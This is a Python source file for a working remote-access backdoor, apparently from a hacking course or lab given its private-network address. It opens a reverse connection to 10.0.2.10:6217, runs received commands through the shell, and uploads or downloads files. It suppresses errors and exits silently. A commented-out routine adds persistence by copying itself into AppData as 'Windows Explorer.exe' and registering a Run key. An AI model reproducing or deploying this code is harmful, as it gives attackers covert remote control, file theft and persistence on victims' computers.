#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Changing working directory to " + path


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful."


class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
        self.connection.connect((ip, port))                                  # connect to specified ip/port

    # function that copies the executable file to a specific path and makes it run on startup of system
    # def become_persistent(self):
    #     evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    #     if not os.path.exists(evil_file_location):
    #         shutil.copyfile(sys.executable, evil_file_location)
    #         # add this executable on system startup
    #         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'
    #                         + evil_file_location + '"', shell=True)

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                continue

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    pass
                elif command[0] == "killconnection":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "PING":
                    command_result = "PONG"
                elif command[0] == "cd" and len(command) > 1:
                    command_result = change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = read_file(command[1])
                elif command[0] == "upload":
                    command_result = write_file(command[1], command[2])
                else:
                    command_result = execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("10.0.2.10", 6217)
    my_backdoor.run()
except Exception:
    sys.exit()
